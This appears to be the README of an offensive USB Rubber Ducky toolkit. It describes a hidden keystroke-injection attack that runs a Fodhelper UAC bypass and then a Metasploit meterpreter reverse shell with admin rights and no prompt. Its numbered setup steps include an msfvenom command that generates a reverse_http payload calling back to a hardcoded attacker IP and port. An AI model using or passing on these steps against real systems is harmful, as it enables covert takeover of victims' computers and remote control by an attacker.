Fodhelper bypass to Metasploit reverse shell

** Key info **

* Twin Duck Special 2 required (See Ducky Flasher OR Firmware list)
* Drive must be called KCSEC to work (Can be changed in ducky code)
* meterpreter-32.ps1 Must be changed to have the right IP/Port
* Ducky_code.txt shows inject.bin decoded (Not needed for setup)


** Explaination **

Ducky commands runs a hidden powershell calling the fod.ps1
This bypasses UAC and runs the metasploit shell with admin rights without a UAC prompt


** Files ** 

* Inject.bin = HID attack to launch fod.ps1 (Soft-coded drive name KCSEC)
* fod.ps1 = Fodhelper UAC Bypass (Inc Softcoded payload name "meterpreter-32.ps1")
* meterpreter-32.ps1 = Meterpretershell psh (Hardcoded IP/Port)


** How to use **

1. Flash rubber ducky TwinDuck Special 2 
   c_duck_v2_S002.hex (Can use Ducky-flasher)

2. rename Rubber Ducky SDCARD to "KCSEC" (inject.bin requires this to launch fod.ps1)

3. Create new payload with msfvenom (change LHOST + LPORT)
   msfvenom -p windows/meterpreter_reverse_http -f psh -o meterpreter-32.ps1 LHOST=192.168.1.159 LPORT=8080

4. Add new meterpreter-32.ps1 to root of KCSEC Ducky Drive

5. Add fod.ps1 to root of KCSEC ducky Drive

6. Add Inject.bin to root of KCSEC Ducky Drive


Once the above is done either reset or unplug/replug your new KCSEC Rubber Ducky to use 
Then press buttom to activate


(You must have inject.bin + fod.ps1 + meterpreter-32.ps1 on the root of the KCSEC Rubber ducky drive)